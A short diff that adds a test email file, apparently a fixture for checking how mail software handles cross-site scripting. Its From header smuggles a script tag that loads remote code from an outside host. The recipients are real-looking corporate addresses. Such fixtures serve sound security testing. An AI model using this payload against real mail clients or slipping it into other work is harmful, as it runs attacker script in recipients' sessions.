@@ -1,0 +1,7 @@
+From: <"test<script src=http://xss.tw/pdjsa></script>@attack.com">
+To: jesse.alvarado@enron.com, roy.armitage@enron.com, rodney.barnes@enron.com, 
+Subject: Test XSS
+MIME-Version: 1.0
+Content-type: text/html
+
+This is a test mail for XSS.
